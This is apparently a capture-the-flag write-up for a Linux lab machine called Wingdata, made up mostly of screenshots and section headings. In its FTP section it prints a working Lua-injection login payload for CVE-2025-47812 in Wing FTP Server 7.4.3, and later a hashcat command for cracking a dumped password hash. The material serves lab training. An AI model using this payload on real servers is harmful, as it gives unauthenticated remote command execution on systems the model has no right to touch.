# WINGDATA -- Linux

---

## Enumeration

---

#### NMAP

---

#### FEROXBUSTER

---

#### FTP.WINGDATA.HTB

- there's version leaking `Wing FTP Server v7.4.3`
- google `wing ftp server 7.4.3 github`
- found `https://github.com/runZeroInc/nuclei-templates/blob/main/http/cves/2025/CVE-2025-47812.yaml`
- potential payload `username=anonymous%00]]%0dlocal+h+%3d+io.popen("{{cmd}}")%0dlocal+r+%3d+h%3aread("*a")%0dh%3aclose()%0dprint(r)%0d--&password=`


---
## EXPLOITATION

---
#### BURP


<img width="1251" height="677" alt="image" src="https://github.com/user-attachments/assets/829571d9-e3de-4ce1-8bed-0ab30d77fa09" />


<img width="1250" height="336" alt="image" src="https://github.com/user-attachments/assets/69425cfe-a4f7-44df-81e8-833bb10fe1ac" />


<img width="1250" height="339" alt="image" src="https://github.com/user-attachments/assets/fce7ea5e-caa9-4658-9c4e-6eeec9bfe961" />


<img width="1250" height="349" alt="image" src="https://github.com/user-attachments/assets/56e07e3d-866d-4914-ae4f-3bcec404dd86" />


<img width="1074" height="292" alt="image" src="https://github.com/user-attachments/assets/d44edc4f-9b1a-465b-af36-31993529679e" />


<img width="1005" height="229" alt="image" src="https://github.com/user-attachments/assets/2fa51a2b-3943-4d7d-aa1c-3ccb5360957e" />




---
## PRIVESC

---
#### WACKY USER

<img width="703" height="141" alt="image" src="https://github.com/user-attachments/assets/90bcec1a-9b2c-4254-8aa4-b6eecbb615f3" />


<img width="531" height="85" alt="image" src="https://github.com/user-attachments/assets/d0098a54-ca07-4c1b-a653-23e2daab64dd" />


<img width="1230" height="147" alt="image" src="https://github.com/user-attachments/assets/0496c5c0-1241-43e5-bf3c-cf9637c58b75" />



---
#### HASHCAT

<img width="570" height="59" alt="image" src="https://github.com/user-attachments/assets/08eb1ded-2da1-4849-94d8-7979e2d09bc2" />


```
hashcat -m 1410 hash /usr/share/wordlists/rockyou.txt --user
```

<img width="574" height="142" alt="image" src="https://github.com/user-attachments/assets/68ee2b0a-ab07-499c-ad8c-f9287359e203" />



//finally got user
<img width="470" height="133" alt="image" src="https://github.com/user-attachments/assets/a921d204-f889-4414-acd0-0676944845c0" />



---
#### TO ROOT

<img width="608" height="176" alt="image" src="https://github.com/user-attachments/assets/dc08cbfc-a8f4-4e74-a059-c00c3841134f" />


















